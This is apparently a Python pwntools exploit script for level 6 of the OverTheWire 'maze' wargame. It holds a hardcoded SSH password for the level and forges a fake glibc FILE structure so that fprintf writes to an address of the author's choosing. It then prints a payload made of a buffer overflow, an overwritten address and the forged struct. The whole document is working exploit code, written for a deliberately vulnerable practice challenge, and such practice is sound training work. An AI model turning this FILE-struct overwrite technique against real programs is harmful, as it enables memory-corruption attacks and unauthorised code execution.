#!/usr/bin/python2
from pwn import *
import os
import time

#Level information for ssh
level = 6
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'epheghuoli'
PORT = 2225

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

#reverse memfrob bytes
def revfrob(s):
    rvrsd = ''
    for c in s:
        rvrsd += chr(ord(c) ^ 42)
    return rvrsd
        

#Craft a faked file struct to be pointed to by fprintf - doing so will write to a memory location
#of my choice
def fake_file(writeaddr):
    #_flags = 0xfbad3484
    _flags = 0x0
    _vtable = 0xf7f98580-16
    _lock = 0xffffd07d
#  _flags           = -72534908,
#  _IO_read_ptr     = 0x0,
#  _IO_read_end     = 0x0,
#  _IO_read_base    = 0x0,
    struct = p32(_flags)             #  _flags           
    struct += p32(0x0)               #  _IO_read_ptr   
    struct += p32(0x0)               #  _IO_read_end   
    struct += p32(0x0)               #  _IO_read_base  
    struct += p32(0x0)               #  _IO_write_base 
    struct += p32(0x0)               #  _IO_write_ptr  
    struct += p32(0x0)               #  _IO_write_end  
    struct += p32(writeaddr)         #  _IO_buf_base   
    struct += p32(writeaddr+8)       #  _IO_buf_end    
    struct += p32(0x0)               #  _IO_save_base  
    struct += p32(0x0)               #  _IO_backup_base
    struct += p32(0x0)               #  _IO_save_end   
    struct += p32(0x0)               #  _markers       
    struct += p32(0x0)               #  _chain         
    struct += p32(0x0)               #  _fileno        
    struct += p32(0x0)               #  _flags2        
    struct += p32(0x0)               #  _old_offset    
    struct += p32(0x0)               #  _cur_column    
    struct += p32(_vtable)           #  _vtable_offset 
    struct += p32(0x0)               #  _shortbuf     
    struct += p32(_lock)             #  _lock            
    struct += p64(0xfffffffffffff)   #  _offset 
    struct += p32(0x0)               #  __pad1           
    struct += p32(0x0)               #  __pad2           
    struct += p32(0x0)               #  __pad3           
    struct += p32(0x0)               #  __pad4           
    struct += p32(0x0)               #  __pad5           
    struct += p32(0x0)               #  _mode            
    for i in range(0, 40):
        #struct += b'\xd0\xff\xff\x6d'#  _unused2
        struct += p32(0x0) #  _unused2

    return struct

#binary = ELF("maze6")
#libc = ELF("/usr/lib32/libc.so.6")
#libc.address = 0xf7da7000

#GDB 'file' struct output - need to replicate
#_IO_file_jumps vtable addr = 0xf7f98580
#_flags = 0xfbad3484
#_lock val = 0x804a238

#$1 = {
#  _flags           = -72534908,
#  _IO_read_ptr     = 0x0,
#  _IO_read_end     = 0x0,
#  _IO_read_base    = 0x0,
#  _IO_write_base   = 0x0,
#  _IO_write_ptr    = 0x0,
#  _IO_write_end    = 0x0,
#  _IO_buf_base     = 0x0,
#  _IO_buf_end      = 0x0,
#  _IO_save_base    = 0x0,
#  _IO_backup_base  = 0x0,
#  _IO_save_end     = 0x0,
#  _markers         = 0x0,
#  _chain           = 0xf7f97c40 <_IO_2_1_stderr_>,
#  _fileno          = 3,
#  _flags2          = 0,
#  _old_offset      = 0,
#  _cur_column      = 0,
#  _vtable_offset   = 0 '\000',
#  _shortbuf        = "",
#  _lock            = 0x804a238,
#  _offset          = -1,
#  __pad1           = x0,
#  __pad2           = 0x804a244,
#  __pad3           = 0x0,
#  __pad4           = 0x0,
#  __pad5           = 0,
#  _mode            = 0,
#  _unused2         = '\000' <repeats 39 times>
#}

writeloc = 0xffffd064
print(revfrob(cyclic(272) + b'\x6c\xd0\xff\xff' + 'FAKEFILE=' + fake_file(writeloc) + b'\xff\xff\xdc\x09'))


